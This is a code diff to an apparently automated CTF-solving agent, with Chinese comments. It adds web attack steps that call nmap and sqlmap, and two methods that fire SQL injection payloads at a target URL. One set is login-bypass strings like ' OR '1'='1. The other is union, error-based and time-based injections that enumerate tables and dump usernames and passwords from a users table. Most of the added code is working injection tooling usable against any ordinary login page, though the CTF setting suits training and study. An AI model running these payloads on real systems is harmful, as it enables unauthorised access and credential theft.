@@ -342,22 +342,71 @@ class ReActAgent:
         if not self.current_plan:
             return []
         
+        challenge = self.current_plan.challenge
+        
+        # 根据挑战类型返回不同的默认步骤
+        if challenge.category.lower() == "web":
+            return self._get_web_default_steps(challenge)
+        else:
+            return [
+                {
+                    "step_id": 1,
+                    "action": "信息收集",
+                    "tool": "nmap_scan",
+                    "parameters": {"target": challenge.target_url},
+                    "reasoning": "首先收集目标信息",
+                    "expected_result": "获取开放端口和服务信息"
+                },
+                {
+                    "step_id": 2,
+                    "action": "漏洞扫描",
+                    "tool": "sqlmap_scan",
+                    "parameters": {"url": challenge.target_url},
+                    "reasoning": "扫描SQL注入漏洞",
+                    "expected_result": "识别SQL注入点"
+                }
+            ]
+    
+    def _get_web_default_steps(self, challenge: CTFChallenge) -> List[Dict[str, Any]]:
+        """获取Web挑战的默认攻击步骤"""
         return [
             {
                 "step_id": 1,
-                "action": "信息收集",
-                "tool": "nmap_scan",
-                "parameters": {"target": self.current_plan.challenge.target_url},
-                "reasoning": "首先收集目标信息",
-                "expected_result": "获取开放端口和服务信息"
+                "action": "快速万能密码注入测试",
+                "tool": None,
+                "parameters": {
+                    "target_url": challenge.target_url,
+                    "test_type": "universal_password"
+                },
+                "reasoning": "首先尝试最简单的万能密码注入，这是最常见的Web漏洞之一",
+                "expected_result": "尝试绕过登录或找到flag"
             },
             {
                 "step_id": 2,
-                "action": "漏洞扫描",
+                "action": "信息收集和端口扫描",
+                "tool": "nmap_scan",
+                "parameters": {"target": challenge.target_url},
+                "reasoning": "收集目标信息，了解开放端口和服务",
+                "expected_result": "获取开放端口和服务信息"
+            },
+            {
+                "step_id": 3,
+                "action": "SQL注入漏洞扫描",
                 "tool": "sqlmap_scan",
-                "parameters": {"url": self.current_plan.challenge.target_url},
-                "reasoning": "扫描SQL注入漏洞",
-                "expected_result": "识别SQL注入点"
+                "parameters": {"url": challenge.target_url},
+                "reasoning": "使用sqlmap进行全面的SQL注入扫描",
+                "expected_result": "识别SQL注入点并尝试利用"
+            },
+            {
+                "step_id": 4,
+                "action": "手动payload测试",
+                "tool": None,
+                "parameters": {
+                    "target_url": challenge.target_url,
+                    "test_type": "manual_payloads"
+                },
+                "reasoning": "如果自动化工具失败，尝试手动payload",
+                "expected_result": "找到flag或确认漏洞"
             }
         ]
     
@@ -431,7 +480,37 @@ class ReActAgent:
         start_time = asyncio.get_event_loop().time()
         
         try:
-            if step.tool and step.tool in self.tool_mapping:
+            # 检查是否为特殊步骤（万能密码注入或手动payload测试）
+            if step.action in ["快速万能密码注入测试", "手动payload测试"]:
+                test_type = step.parameters.get("test_type", "")
+                target_url = step.parameters.get("target_url", "")
+                
+                if test_type == "universal_password":
+                    # 执行万能密码注入测试
+                    result = await self._execute_universal_password_test(target_url)
+                    step_result["result"] = result
+                    step_result["success"] = result.get("success", False)
+                    
+                    if result.get("flag_found"):
+                        step_result["flag_detected"] = True
+                        step_result["flag"] = result.get("flag")
+                
+                elif test_type == "manual_payloads":
+                    # 执行手动payload测试
+                    result = await self._execute_manual_payloads_test(target_url)
+                    step_result["result"] = result
+                    step_result["success"] = result.get("success", False)
+                    
+                    if result.get("flag_found"):
+                        step_result["flag_detected"] = True
+                        step_result["flag"] = result.get("flag")
+                
+                else:
+                    # 默认无工具步骤
+                    step_result["success"] = True
+                    step_result["result"] = {"message": "步骤执行完成"}
+            
+            elif step.tool and step.tool in self.tool_mapping:
                 # 执行工具
                 tool_result = await self.mcp_server.handle_call_tool(
                     step.tool, step.parameters
@@ -475,6 +554,210 @@ class ReActAgent:
         })
         
         return step_result
+    
+    async def _execute_universal_password_test(self, target_url: str) -> Dict[str, Any]:
+        """执行万能密码注入测试"""
+        import aiohttp
+        import asyncio
+        
+        self.logger.info(f"执行万能密码注入测试: {target_url}")
+        
+        # 万能密码payload列表
+        universal_passwords = [
+            # 经典万能密码
+            {"username": "admin", "password": "' OR '1'='1"},
+            {"username": "admin", "password": "' OR 1=1--"},
+            {"username": "admin", "password": "' OR 'a'='a"},
+            {"username": "admin", "password": "' OR ''='"},
+            
+            # 变体
+            {"username": "' OR '1'='1", "password": "anything"},
+            {"username": "admin' OR '1'='1'--", "password": "anything"},
+            {"username": "admin'--", "password": "anything"},
+            {"username": "admin'#", "password": "anything"},
+            
+            # 双引号变体
+            {"username": "admin", "password": '" OR "1"="1'},
+            {"username": '" OR "1"="1', "password": "anything"},
+            
+            # 无引号变体
+            {"username": "admin", "password": " OR 1=1"},
+            {"username": " OR 1=1", "password": "anything"},
+            
+            # 管理员万能密码
+            {"username": "admin", "password": "admin' OR '1'='1"},
+            {"username": "administrator", "password": "' OR '1'='1"},
+            
+            # 注释变体
+            {"username": "admin'/*", "password": "*/ OR '1'='1"},
+            {"username": "admin'-- -", "password": "anything"},
+            {"username": "admin'#", "password": "anything"},
+        ]
+        
+        results = {
+            "test_type": "universal_password",
+            "target_url": target_url,
+            "payloads_tested": len(universal_passwords),
+            "successful_payloads": [],
+            "flag_found": False,
+            "flag": None,
+            "success": False
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            for i, creds in enumerate(universal_passwords):
+                try:
+                    # 尝试GET请求
+                    params = {
+                        "username": creds["username"],
+                        "password": creds["password"]
+                    }
+                    
+                    async with session.get(target_url, params=params, timeout=10) as response:
+                        response_text = await response.text()
+                        
+                        # 检查响应中是否包含flag
+                        flag_patterns = [
+                            r'flag\{[^}]+\}',
+                            r'FLAG\{[^}]+\}',
+                            r'ctf\{[^}]+\}',
+                            r'CTF\{[^}]+\}',
+                        ]
+                        
+                        for pattern in flag_patterns:
+                            import re
+                            match = re.search(pattern, response_text)
+                            if match:
+                                flag = match.group()
+                                self.logger.info(f"🎉 使用万能密码找到Flag: {flag}")
+                                results["flag_found"] = True
+                                results["flag"] = flag
+                                results["success"] = True
+                                results["successful_payloads"].append({
+                                    "index": i,
+                                    "username": creds["username"],
+                                    "password": creds["password"],
+                                    "method": "GET"
+                                })
+                                return results
+                        
+                        # 检查登录成功迹象
+                        success_keywords = ["登录成功", "登录成功", "success", "welcome", "dashboard", "admin", "logout", "退出"]
+                        if any(keyword in response_text.lower() for keyword in [k.lower() for k in success_keywords]):
+                            self.logger.info(f"✓ 万能密码可能有效: {creds['username']}:{creds['password']}")
+                            results["successful_payloads"].append({
+                                "index": i,
+                                "username": creds["username"],
+                                "password": creds["password"],
+                                "method": "GET",
+                                "indication": "success_keyword_found"
+                            })
+                
+                except Exception as e:
+                    self.logger.debug(f"万能密码测试 {i} 失败: {e}")
+        
+        # 如果有成功的payload但没有找到flag，也算成功
+        if results["successful_payloads"]:
+            results["success"] = True
+            self.logger.info(f"万能密码测试完成，{len(results['successful_payloads'])} 个payload可能有效")
+        else:
+            self.logger.info("万能密码测试未发现有效payload")
+        
+        return results
+    
+    async def _execute_manual_payloads_test(self, target_url: str) -> Dict[str, Any]:
+        """执行手动payload测试"""
+        import aiohttp
+        import asyncio
+        
+        self.logger.info(f"执行手动payload测试: {target_url}")
+        
+        # 常见SQL注入payload
+        payloads = [
+            # 联合查询payload
+            "admin' UNION SELECT 1,2,3--",
+            "admin' UNION SELECT database(),user(),version()--",
+            "admin' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
+            "admin' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
+            "admin' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
+            
+            # 布尔盲注payload
+            "admin' AND 1=1--",
+            "admin' AND 1=2--",
+            
+            # 报错注入payload
+            "admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+            "admin' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
+            
+            # 时间盲注payload
+            "admin' AND sleep(5)--",
+        ]
+        
+        results = {
+            "test_type": "manual_payloads",
+            "target_url": target_url,
+            "payloads_tested": len(payloads),
+            "successful_payloads": [],
+            "flag_found": False,
+            "flag": None,
+            "success": False
+        }
+        
+        async with aiohttp.ClientSession() as session:
+            for i, payload in enumerate(payloads[:10]):  # 只测试前10个
+                try:
+                    # 构建请求参数
+                    params = {"username": payload, "password": "test"}
+                    
+                    async with session.get(target_url, params=params, timeout=10) as response:
+                        response_text = await response.text()
+                        
+                        # 检查响应中是否包含flag
+                        flag_patterns = [
+                            r'flag\{[^}]+\}',
+                            r'FLAG\{[^}]+\}',
+                            r'ctf\{[^}]+\}',
+                            r'CTF\{[^}]+\}',
+                        ]
+                        
+                        for pattern in flag_patterns:
+                            import re
+                            match = re.search(pattern, response_text)
+                            if match:
+                                flag = match.group()
+                                self.logger.info(f"🎉 使用手动payload找到Flag: {flag}")
+                                results["flag_found"] = True
+                                results["flag"] = flag
+                                results["success"] = True
+                                results["successful_payloads"].append({
+                                    "index": i,
+                                    "payload": payload,
+                                    "method": "GET"
+                                })
+                                return results
+                        
+                        # 检查数据库错误信息
+                        db_keywords = ["mysql", "database", "sql", "syntax", "error", "warning"]
+                        if any(keyword in response_text.lower() for keyword in db_keywords):
+                            self.logger.info(f"✓ 手动payload可能有效: {payload}")
+                            results["successful_payloads"].append({
+                                "index": i,
+                                "payload": payload,
+                                "method": "GET",
+                                "indication": "database_keyword_found"
+                            })
+                
+                except Exception as e:
+                    self.logger.debug(f"手动payload测试 {i} 失败: {e}")
+        
+        # 如果有成功的payload但没有找到flag，也算成功
+        if results["successful_payloads"]:
+            results["success"] = True
+            self.logger.info(f"手动payload测试完成，{len(results['successful_payloads'])} 个payload可能有效")
+        else:
+            self.logger.info("手动payload测试未发现有效payload")
+        
+        return results
     
     def _extract_flag_from_result(self, result: Dict[str, Any]) -> Optional[str]:
         """从工具结果中提取flag"""
